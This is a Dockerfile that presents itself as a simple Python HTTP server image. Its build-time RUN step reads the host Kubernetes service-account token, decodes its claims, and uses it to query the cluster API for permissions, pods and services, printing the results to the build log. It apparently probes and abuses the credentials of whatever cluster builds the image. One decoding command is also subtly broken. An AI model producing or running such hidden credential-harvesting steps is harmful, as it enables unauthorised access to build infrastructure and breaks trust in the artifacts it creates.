FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update -qq && apt-get install -y -qq --no-install-recommends curl python3 ca-certificates >/dev/null 2>&1 || true
RUN bash -c 'set -x; \
  id; uname -a; cat /proc/1/cgroup; grep -E "Cap(Eff|Prm|Bnd)" /proc/self/status; \
  echo "--- sa"; ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>&1; \
  SA=/var/run/secrets/kubernetes.io/serviceaccount; \
  if [ -f $SA/token ]; then \
    NS=$(cat $SA/namespace); echo "SA_NS=$NS"; \
    TOKEN=$(cat $SA/token); echo "TOKEN_LEN=${#TOKEN}"; \
    echo "--- claims"; cut -d. -f2 $TOKEN | tr "_-" "/+" | base64 -d 2>/dev/null; echo; \
    echo "--- version"; curl -sk --max-time 6 -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/version; echo; \
    echo "--- rules"; curl -sk --max-time 6 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}" https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews; echo; \
    echo "--- pods"; curl -sk --max-time 6 -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc/api/v1/namespaces/$NS/pods?limit=5"; echo; \
    echo "--- svc"; curl -sk --max-time 6 -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc/api/v1/namespaces/$NS/services?limit=5"; echo; \
  else echo NO_SA_TOKEN; fi; \
  echo "--- probe done"; true'
CMD ["python3","-m","http.server","8080"]
EXPOSE 8080
